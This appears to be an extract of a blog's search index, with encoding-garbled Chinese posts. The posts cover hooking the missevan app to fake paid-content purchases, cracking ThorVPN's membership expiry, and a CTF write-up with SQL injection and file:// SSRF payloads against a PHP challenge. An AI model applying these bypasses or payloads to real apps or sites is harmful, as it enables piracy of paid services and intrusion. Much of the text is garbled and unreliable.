            <tag> WEB </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>missevan åŠŸèƒ½é€†å‘åˆ†æ</title>
      <link href="/2022/08/04/missevan%20%E5%8A%9F%E8%83%BD%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
      <url>/2022/08/04/missevan%20%E5%8A%9F%E8%83%BD%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="æ ·æœ¬"><a href="#æ ·æœ¬" class="headerlink" title="æ ·æœ¬"></a>æ ·æœ¬</h2><p>åŒ…åï¼šcn.missevan<br>ç‰ˆæœ¬ï¼š5.5.0</p><h2 id="â€œå·²è´­â€ï¼ˆå¤±è´¥ï¼‰"><a href="#â€œå·²è´­â€ï¼ˆå¤±è´¥ï¼‰" class="headerlink" title="â€œå·²è´­â€ï¼ˆå¤±è´¥ï¼‰"></a>â€œå·²è´­â€ï¼ˆå¤±è´¥ï¼‰</h2><p>åˆ†æä»˜è´¹å¹¿æ’­å‰§â€œå·²è´­â€åŠŸèƒ½</p><h4 id="åç¼–è¯‘APP"><a href="#åç¼–è¯‘APP" class="headerlink" title="åç¼–è¯‘APP"></a>åç¼–è¯‘APP</h4><p>Apktoolåç¼–è¯‘apkæ—¶ï¼Œé‡åˆ°â€œdexéƒ¨åˆ†åŠ å¯†â€é—®é¢˜ï¼Œè§£å†³åŠæ³•ï¼š.&#x2F;apktool d xx.apk â€“only-main-classesã€‚</p><h4 id="åˆ†æå·¥å…·"><a href="#åˆ†æå·¥å…·" class="headerlink" title="åˆ†æå·¥å…·"></a>åˆ†æå·¥å…·</h4><p>ä¸€å¼€å§‹Jebä¸€ä¸ªä¸€ä¸ªdexåˆ†æï¼Œä½†æ˜¯dexä¹‹é—´å‡½æ•°è°ƒç”¨ã€äº¤å‰å¼•ç”¨éå¸¸éš¾æ‰¾ï¼ˆå…±6ä¸ªdexï¼‰ï¼Œåé¢jadxå¥½ç”¨äº†å¾ˆå¤šã€‚Jebæ— æ³•å¯¹apkæ•´ä½“åˆ†ææŠ¥é”™ä¸ºå†…å­˜ä¸å¤Ÿï¼Œæ‰©å¤§javaå†…å­˜ä¹Ÿæ²¡æœ‰è§£å†³ï¼Œåæ”¾å¼ƒã€‚</p><h4 id="å®šä½ä¸hook"><a href="#å®šä½ä¸hook" class="headerlink" title="å®šä½ä¸hook"></a>å®šä½ä¸hook</h4><p>ä»˜è´¹ï¼Œä¸payæœ‰å…³ï¼Œæœç´¢å…³é”®å­—ï¼Œå‘ç°æœ‰å¾ˆå¤šgetNeedPayã€getPayTypeã€needPayã€getCurrentNeedPayå…³é”®å­—å‡½æ•°ä»¥åŠå­—ç¬¦ä¸²ï¼Œé€šè¿‡objection é€ä¸€hookæŸ¥çœ‹æ˜¯å¦çœŸçš„è¢«è°ƒç”¨ï¼Œå…¨éƒ¨hookå¹¶ä¿®æ”¹è¿”å›å€¼ï¼Œå…¶ä¸­getCurrentNeedPayè¿”å›-1ï¼Œå‰©ä½™è¿”å›2ã€‚<br>ï¼ˆlinux åœ¨æ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰æ–‡ä»¶ä¸­æŸ¥æ‰¾å­—ç¬¦ä¸²ï¼šgrep -r â€œstrsâ€dirï¼›jadxç›´æ¥æœç´¢å…³é”®å­—ï¼Œå‹¾é€‰insentive caseï¼Œå¿½ç•¥å¤§å°å†™ï¼‰<br>Â è¿™é‡Œä¸€å¼€å§‹æ²¡æœ‰å¯¹getCurrentNeedPayè¿›è¡Œhookï¼Œå¯¼è‡´è¿›å…¥ä»˜è´¹éŸ³é¢‘æ’­æ”¾ç•Œé¢åæ˜¾ç¤ºâ€œç«‹å³æ”¶å¬â€ï¼Œé€šè¿‡æœç´¢å…³é”®å­—ï¼Œåˆ†æä¸Šä¸‹æ–‡ä»£ç æ‰å‘ç°å¯¹getCurrentNeedPayè¿›è¡Œäº†åˆ¤æ–­ã€‚<br><img src="/2022/08/04/missevan%20%E5%8A%9F%E8%83%BD%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1ADAF972-E991-4A1B-A278-F1E98AF13EDA.png" alt="674e49409ce418a6526ab17ff26529a2.png"><br>ï¼ˆå®Œæ•´hookè„šæœ¬è§jsï¼‰</p><h4 id="é‡ç‚¹çªç ´ï¼Œé€†å‘åˆ†æã€hook"><a href="#é‡ç‚¹çªç ´ï¼Œé€†å‘åˆ†æã€hook" class="headerlink" title="é‡ç‚¹çªç ´ï¼Œé€†å‘åˆ†æã€hook"></a>é‡ç‚¹çªç ´ï¼Œé€†å‘åˆ†æã€hook</h4><p>hookå®Œåé¡µé¢ç”±â€œä»˜è´¹â€-&gt;â€œå·²è´­â€ï¼Œä½†æ˜¯è¿›å…¥ä»˜è´¹éŸ³é¢‘æ’­æ”¾ç•Œé¢ä»ä¸æ’­æ”¾éŸ³é¢‘ã€‚</p><p>åœ¨objectionä¸­å¯¹å‡½æ•°è°ƒç”¨æ ˆé€å±‚å¾€ä¸Šè¿½æº¯ï¼Œå‘ç°handlemsgï¼ˆcn.missevan.play.utils.PlayCallbackHandler.handleMessageï¼‰ä¸­å…è´¹å’Œä»˜è´¹çš„â€œsoundurlâ€å€¼ä¸åŒï¼Œå³ä»˜è´¹çš„å€¼ä¸ºç©ºã€‚</p><p>(ç”±äºè¾ƒæ•æ„Ÿï¼Œhook å›¾ç‰‡å·²éšè—)</p><p>åˆ†æä¸Šä¸‹æ–‡ï¼Œå› ä¸ºæ˜¯å›è°ƒï¼Œé€šè¿‡è°ƒç”¨æ ˆå°±èƒ½çœ‹å‡ºæ— æ³•è¿½æº¯å‘é€æ¶ˆæ¯çš„æºå¤´ã€‚</p><h5 id="æ€è·¯1"><a href="#æ€è·¯1" class="headerlink" title="æ€è·¯1:"></a>æ€è·¯1:</h5><p>æœç´¢æ‰€æœ‰â€œsoundurlâ€å…³é”®å­—ï¼Œçœ‹æ˜¯å“ªä¸ªå‡½æ•°å¤„ç†æˆ–è€…å‘é€urlçš„ï¼Œä½†æ˜¯objection hookæ‰€æœ‰ï¼Œå®é™…éƒ½æ²¡æœ‰è°ƒç”¨ç›¸å…³å‡½æ•°â€¦â€¦æ˜¯ä¸ªå¹Œå­ã€‚</p><h5 id="æ€è·¯2"><a href="#æ€è·¯2" class="headerlink" title="æ€è·¯2:"></a>æ€è·¯2:</h5><p>é€šè¿‡å¡ä½çš„ç•Œé¢ï¼Œå¯»æ‰¾å¯ç–‘å‡½æ•°ï¼Œè¿™é‡Œçš„å¯»æ‰¾æ–¹å¼æ˜¯é€šè¿‡ä»˜è´¹éŸ³é¢‘æ’­æ”¾ç•Œé¢åæ˜¾ç¤ºâ€œç«‹å³æ”¶å¬â€åˆ†æä¸Šä¸‹æ–‡ï¼Œæ‰¾åˆ°ä»˜è´¹éŸ³é¢‘æ’­æ”¾ç•Œé¢ç±»æ˜¯â€œcn.missevan.view.fragment.PlayFragmentâ€ï¼Œä»¥åŠä¹‹å‰å¡ä½çš„â€œgetCurrentNeedPayâ€è¿›è¡Œé™æ€ä»£ç åˆ†æï¼Œå®é™…ä¸Šå¹¶æ²¡æœ‰æ‰¾åˆ°æ’­æ”¾éŸ³é¢‘çš„ç›¸å…³å‡½æ•°ã€‚ä¹‹åå…¨å±€å¯»æ‰¾æ’­æ”¾éŸ³é¢‘çš„ç±»ï¼ˆmediaplayerä¹‹ç±»çš„ï¼Œobjectionä¸€hook appå°±å´©äº†ï¼Œæœ‰å¯èƒ½æ˜¯hookçš„ç±»æˆ–è€…å‡½æ•°ä¸å¯¹ï¼Œå¯¼è‡´å¤šè¿›ç¨‹è¿è¡Œæ—¶ç¨‹åºå¡ä½å´©æºƒï¼Œå› ä¸ºæ¶‰åŠåˆ°éŸ³é¢‘ç³»ç»Ÿç±»çš„æºç åˆ†æï¼Œç”±äºæ°´å¹³ä¸å¤Ÿæ²¡å†å¾€ä¸‹åˆ†æï¼‰â€¦â€¦çŒœæµ‹è¦ä¹ˆæ˜¯soå¤„ç†ï¼Œè¦ä¹ˆæœåŠ¡å™¨åå°åšäº†èº«ä»½è®¤è¯ç­‰å¤„ç†ï¼Œå¯¼è‡´æœåŠ¡å™¨å°±æ²¡è¿”å›å¯æ’­æ”¾çš„urlï¼ŒéŸ³é¢‘ç±»è‡ªç„¶æ— æ³•æ­£å¸¸æ’­æ”¾ã€‚</p><p>(ç”±äºè¾ƒæ•æ„Ÿï¼Œhook å›¾ç‰‡å·²éšè—)</p><p>è¿™é‡Œæœ‰ä¸ªå°æ’æ›²ï¼Œâ€œcn.missevan.play.utils.PlayUtils.isPlayingâ€å¦‚æœhookè¿”å›ä¸ºtrueï¼Œä»˜è´¹çš„éŸ³é¢‘ä¹Ÿå¯ä»¥è‡ªåŠ¨åŠ è½½å¼¹å¹•ï¼Œä½†ä»æ— æ³•æ’­æ”¾éŸ³é¢‘ã€‚åˆ†æä¸Šä¸‹æ–‡æœªæ‰¾åˆ°éŸ³é¢‘ç›¸å…³å‡½æ•°æˆ–ä»£ç é€»è¾‘ã€‚</p><h5 id="æ€è·¯3"><a href="#æ€è·¯3" class="headerlink" title="æ€è·¯3:"></a>æ€è·¯3:</h5><p>å°è¯•æŠ“åŒ…ï¼Œæ²¡çœ‹å‡ºåŒºåˆ«ã€‚å› ä¸ºéƒ½æ˜¯okhttp3ä¼ è¾“ï¼Œåˆ†æäº†ä¸Šä¸‹æ–‡ï¼Œæ²¡æ‰¾åˆ°ã€‚</p><h5 id="æ€è·¯4"><a href="#æ€è·¯4" class="headerlink" title="æ€è·¯4:"></a>æ€è·¯4:</h5><p>Soå¤„ç†çš„è¯ï¼Œå…¨å±€æœç´¢java jniæ³¨å†Œå£°æ˜ï¼ˆstatic native xx xxï¼‰ï¼Œæ²¡æœ‰å‘ç°ä¸æ’­æ”¾ç›¸å…³çš„ç±»å‡½æ•°ä½¿ç”¨äº†jniï¼›èº«ä»½è®¤è¯ï¼Œåˆ™éœ€è¦ä¼ªè£…æˆå·²è´­ä¹°ç”¨æˆ·ï¼ŒçŒœæµ‹æœåŠ¡å™¨å¯¹useridçš„è´­ä¹°è®°å½•åšäº†æŠ¥é”™ï¼Œå•ä»å®¢æˆ·ç«¯æ— æ³•è§£å†³ã€‚</p><h5 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h5><p>æœªæˆåŠŸ<br>1ï¼‰Â å‡½æ•°åå°„ã€handleã€okhttpçš„è·Ÿè¸ªåˆ†æï¼šå¯¹Androidå¼€å‘ã€å›è°ƒæœºåˆ¶äº†è§£ä¸å¤Ÿ<br>2ï¼‰Â Interfaceæ¥å£çš„é‡å†™ï¼šå…¨å±€æœç´¢æ¥å£ç±»ï¼Œå¯»æ‰¾æ‰€æœ‰å¯èƒ½é‡å†™çš„ç±»é€ä¸€åˆ†æ&#x2F;hookè°ƒç”¨æƒ…å†µã€‚<br>3ï¼‰æ¢ç§æ€è·¯ï¼šä¿®æ”¹é’»çŸ³æ•°é‡ï¼Œç›´æ¥ä¹°å‰§ï¼Œå³æ— é™é’»çŸ³ç‰ˆã€‚ï¼ˆå¾…å°è¯•ï¼‰Â 4ã€Â ç½‘ä¸Šçš„ç ´è§£ç‰ˆï¼š<br>å¯¹æ¯”åˆ†æï¼Œç ´è§£ç‰ˆä»…ä¿®æ”¹äº†getNeedPayçš„è¿”å›å€¼ï¼ˆ2ï¼‰ï¼Œå…¶ä½™æ²¡åŠ¨ï¼Œä½†æ˜¯æ•ˆæœè·Ÿæˆ‘çš„hookç»“æœä¸€æ ·ã€‚<br>åŒæ—¶ç ´è§£ç‰ˆå†…åµŒäº†ç­¾åä¿®æ”¹hookä»£ç ï¼š<a href="https://www.52pojie.cn/thread-995777-1-1.html">https://www.52pojie.cn/thread-995777-1-1.html</a></p><h2 id="â€œæ— é™é’»çŸ³â€ï¼ˆå¾…å°è¯•ï¼‰"><a href="#â€œæ— é™é’»çŸ³â€ï¼ˆå¾…å°è¯•ï¼‰" class="headerlink" title="â€œæ— é™é’»çŸ³â€ï¼ˆå¾…å°è¯•ï¼‰"></a>â€œæ— é™é’»çŸ³â€ï¼ˆå¾…å°è¯•ï¼‰</h2><p>æ€è·¯ï¼šä¿®æ”¹è´­ä¹°æˆåŠŸçš„å›ä¼ åŒ…ï¼ˆå›°éš¾ï¼‰ã€hookç›¸å…³é’»çŸ³æ•°é‡ä»£ç çš„è¿”å›å€¼ï¼ˆå®¹æ˜“ï¼Œä½†æˆåŠŸç‡å¦‚ä½•ï¼Ÿï¼‰<br><img src="/7e989e27f9b9dbf906a93f24ab3cc6c6.png" alt="7e989e27f9b9dbf906a93f24ab3cc6c6.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> AndroidReverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThorVPNç ´è§£ä½¿ç”¨æœ‰æ•ˆæœŸ</title>
      <link href="/2021/05/21/ThorVPN%E7%A0%B4%E8%A7%A3%E4%BD%BF%E7%94%A8%E6%9C%89%E6%95%88%E6%9C%9F/"/>
      <url>/2021/05/21/ThorVPN%E7%A0%B4%E8%A7%A3%E4%BD%BF%E7%94%A8%E6%9C%89%E6%95%88%E6%9C%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="ThorVPN"><a href="#ThorVPN" class="headerlink" title="ThorVPN"></a>ThorVPN</h1><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>æ ¹æ®æç¤ºå­—ç¬¦ä¸²â€œè¿˜å‰©xå¤©ä¼šå‘˜â€</p><p>-&gt;res&#x2F;values-zh-rCN&#x2F;strings.xml:: 205:     <string name="message_default">ä¼šå‘˜è¿˜æœ‰{}å¤©</string></p><p>-&gt;åœ¨ä»£ç ä¸­æ‰¾çš„è¯¥å­—ç¬¦ä¸²çš„å¼•ç”¨ find:message_defaultï¼Œå³R0.string.message_default</p><p>é˜…è¯»è¯¥æ®µä»£ç é€»è¾‘ï¼Œå¾—åˆ°service_expired_timeè¿›è¡Œåˆ¤æ–­ï¼Œæ‰€ä»¥ç›®æ ‡æ˜¯å¯¹service_expired_timeé€šè¿‡äº¤å‰å¼•ç”¨æ‰¾åˆ°è·å¾—è¿™ä¸ªå­—ç¬¦ä¸²çš„åœ°æ–¹<br><img src="/2021/05/21/ThorVPN%E7%A0%B4%E8%A7%A3%E4%BD%BF%E7%94%A8%E6%9C%89%E6%95%88%E6%9C%9F/1F3380F1-0028-4FA2-A012-AE2FD45E5CA0.png" alt="bc4965505e9f63de4eeedf877e9efc73"></p><p>åœ¨è¿›å…¥å¤„ç†è¿™ä¸ªå­—ç¬¦ä¸²é€»è¾‘ä¹‹å‰å¾—åˆ°æœåŠ¡å™¨è¿”å›çš„strï¼Œè¿›è¡Œè§£å¯†ã€æŠŠjsonè½¬æ¢æˆmapä¿å­˜</p><h2 id="ç ´è§£"><a href="#ç ´è§£" class="headerlink" title="ç ´è§£"></a>ç ´è§£</h2><p>é€šè¿‡è‡ªå·±è§£å¯†strï¼Œå’Œapp logè¾“å‡ºæ¯”å¯¹ï¼Œå¾—åˆ°åŸå§‹jsonä¸²çš„æ ¼å¼å†…å®¹ï¼Œè‡ªå·±æ¨¡æ‹Ÿå†™mapæ•°æ®å¹¶è½¬æ¢æˆsmaliä¿å­˜åˆ°appä¸­é‡æ‰“åŒ…<br><img src="/2021/05/21/ThorVPN%E7%A0%B4%E8%A7%A3%E4%BD%BF%E7%94%A8%E6%9C%89%E6%95%88%E6%9C%9F/AAD68742-6B23-49E3-93EF-05A4E5FDD481.png" alt="544d876e24f44459a270e7b6ce738ee0"></p><h2 id="tcpdumpæ•°æ®"><a href="#tcpdumpæ•°æ®" class="headerlink" title="** tcpdumpæ•°æ® **"></a>** tcpdumpæ•°æ® **</h2><p>åœ¨ä¸é€šè¿‡ä¸­é—´äººæƒ…å†µä¸‹å¾—åˆ°æ‰‹æœºçš„æ•°æ®åŒ…</p><h2 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h2><p>APK:ThorVPN 0.9+<br>refer:<a href="https://mp.weixin.qq.com/s/ih4pIs8NjFPWolV-1uF6PQ">https://mp.weixin.qq.com/s/ih4pIs8NjFPWolV-1uF6PQ</a></p><h2 id="å¾…è§£å†³"><a href="#å¾…è§£å†³" class="headerlink" title="å¾…è§£å†³"></a>å¾…è§£å†³</h2><p>TLSæŠ“åŒ…</p>]]></content>
      
      
      
        <tags>
            
            <tag> AndroidReverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘é¼æ¯2018 Fakebook(sqlæ³¨å…¥+ssrf)</title>
      <link href="/2021/02/14/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DFakebook(sql%E6%B3%A8%E5%85%A5+ssrf)/"/>
      <url>/2021/02/14/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DFakebook(sql%E6%B3%A8%E5%85%A5+ssrf)/</url>
      
        <content type="html"><![CDATA[<p>é€šè¿‡ç½‘ç«™åŠŸèƒ½ï¼ŒçŒœæµ‹å­˜åœ¨ssrfï¼Œå› ä¸ºè¯»å’Œè§£æurl_blog<br>ä½†æ˜¯ç›´æ¥åœ¨æ³¨å†ŒåŠŸèƒ½å¤„é€šè¿‡file:&#x2F;&#x2F;{flag}ä¸æˆåŠŸï¼ŒçŒœæµ‹æ˜¯è¿‡æ»¤äº†ï¼Œæºç ä¸­isValidBlogç¡®å®æ£€æµ‹äº†httpï¼Œç„¶åæ³¨å†Œ<a href="http://flag.php,æŸ¥çœ‹åæ— å†…å®¹è¿”å›,åº”è¯¥æ˜¯æ²¡æœ‰å›æ˜¾,ä»¥$flagçš„å½¢å¼å­˜åœ¨/">http://flag.phpï¼ŒæŸ¥çœ‹åæ— å†…å®¹è¿”å›ï¼Œåº”è¯¥æ˜¯æ²¡æœ‰å›æ˜¾ï¼Œä»¥$flagçš„å½¢å¼å­˜åœ¨</a></p><h2 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h2><p>æ³¨å†Œåè®¿é—®idå­˜åœ¨sqlæ³¨å…¥</p><p>payload:</p><p>è¿™ä¸ªé¢˜ç”¨æŠ¥é”™æ³¨å…¥ä¹Ÿèƒ½æˆåŠŸ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?n0=<span class="number">0</span>%<span class="number">20</span>union<span class="comment">/**/</span>select%<span class="number">201</span>,<span class="title function_ invoke__">database</span>(),<span class="number">3</span>,<span class="number">4</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„selectçš„å­—æ®µä½ç½®ï¼Œç”±æºç å¾—çŸ¥æ•°æ®åº“å­—æ®µä¸ºno(int),username(char),age(int),data(char)ï¼Œdatabase()æ˜¯å­—ç¬¦ä¸²ï¼Œåœ¨2ï¼Œ4ä½ç½®èƒ½æŠ¥å‡ºæ¥ï¼Œä½†4éœ€è¦unserializeï¼Œè¾“å…¥çš„å†…å®¹æ˜¯åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œåªèƒ½åœ¨2çˆ†</p></blockquote><blockquote><p>unionæ˜¯è”åˆï¼Œå¦‚æœå‰ä¸€ä¸ªselectæ­£ç¡®æ—¶ï¼Œä¸ä¼šè¿”å›å³è¾¹çš„selectç»“æœ</p></blockquote><p>ç›²æ³¨ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;1+and+(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))=&#123;&#125;)%23&#x27;</span>.<span class="title function_ invoke__">format</span>(i, j)</span><br><span class="line">payload = <span class="string">&#x27;1+and+(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=test)),&#123;&#125;,1))=&#123;&#125;)%23&#x27;</span>.<span class="title function_ invoke__">format</span>(i,j)</span><br><span class="line">payload = <span class="string">&#x27;1+and+(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=\&#x27;users\&#x27;)),&#123;&#125;,1))=&#123;&#125;)%23&#x27;</span>.<span class="title function_ invoke__">format</span>(i,j)</span><br><span class="line">payload = <span class="string">&#x27;1+and+(ascii(substr((select(group_concat(passwd))from(users)),&#123;&#125;,1))=&#123;&#125;)%23&#x27;</span>.<span class="title function_ invoke__">format</span>(i,j)</span><br></pre></td></tr></table></figure><p>çˆ†å‡ºæ¥<br>database &#x3D; â€˜fakebookâ€™<br>table_name &#x3D; â€˜usersâ€™<br>columns &#x3D; â€˜no,username,passwd,dataâ€™<br>data &#x3D; O:8:â€UserInfoâ€:3:{s:4:â€nameâ€;s:1:â€1â€;s:3:â€ageâ€;i:1;s:4:â€blogâ€;s:20:â€<a href="http://www.baidu.com&quot;;}/">http://www.baidu.com&quot;;}</a></p><h2 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h2><p>unserialize data å¾—åˆ°UserInfoç±»nameã€ageã€blog<br>ç»“åˆcurl(blog)ï¼Œå­˜åœ¨ssrf<br>åœ¨blogé€šè¿‡file:&#x2F;&#x2F;è¯»å–flagæ–‡ä»¶<br>æ„é€ payloadåºåˆ—åŒ–<br>ï¼ˆè¿™é¢˜å­˜åœ¨filescanï¼Œrobots.txt-&gt;user.php.bakï¼Œå¯ä»¥çŸ¥é“UserInfoç±»å…·ä½“å†…å®¹ï¼Œå’Œblacklistsï¼Œæˆ‘ç›´æ¥çŒœäº†ï¼‰<br><img src="/2021/02/14/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DFakebook(sql%E6%B3%A8%E5%85%A5+ssrf)/60AD6330-7784-4534-8FE0-FBB668942E2A.png" alt="3a4827e7c285893174183153d4404356"></p><p>ç„¶åé€šè¿‡sqlæ³¨å…¥å¾—åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//$a=&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:20:&quot;http://www.baidu.com&quot;;&#125;&#x27;;</span></span><br><span class="line"><span class="comment">//print_r(unserialize($a));</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">UserInfo</span>();</span><br><span class="line"><span class="comment">//echo $a;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>); <span class="comment">//O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span>                </span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=0%20union/**/select%201,2,3,%27O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;%27%20from%20users%20%23</span><br></pre></td></tr></table></figure><blockquote><p>æœ‰ä¸ªå°æŠ€å·§ï¼Œä¸éœ€è¦base64decodeï¼Œç›´æ¥æŸ¥çœ‹chromeç½‘é¡µæºä»£ç å¾—åˆ°è§£ç åçš„<br><img src="/2021/02/14/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DFakebook(sql%E6%B3%A8%E5%85%A5+ssrf)/31567B76-5C98-45E8-8824-CFE78046826D.png" alt="42d1bcc4865cf7b270958db4013ac01a"></p></blockquote><h2 id="ssrf-ç½‘é¡µæºç "><a href="#ssrf-ç½‘é¡µæºç " class="headerlink" title="ssrf_ç½‘é¡µæºç "></a>ssrf_ç½‘é¡µæºç </h2><p>é€šè¿‡è¿™ç§æ–¹å¼å¾—åˆ°éƒ¨åˆ†æºç ï¼š</p><p>user.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span 